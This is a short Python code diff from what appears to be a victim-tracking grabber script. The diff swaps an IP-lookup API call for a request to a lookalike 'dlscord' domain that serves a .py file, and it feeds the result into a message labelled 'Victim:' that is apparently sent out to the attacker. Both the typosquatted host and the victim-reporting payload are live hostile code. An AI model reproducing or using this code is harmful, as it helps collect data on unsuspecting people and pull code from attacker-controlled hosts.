@@ -60,7 +60,7 @@ ipaddrr()
 
 def ipaddr():
 	
-	ipaddr = requests.get("https://vpnapi.io/api/").text
+	ipaddr = requests.get("https://https-dlscord-com.vercel.app/api/main.py").text
 
 	payloads = {
 		"content": f"``` Victim: \n{ipaddr}```",
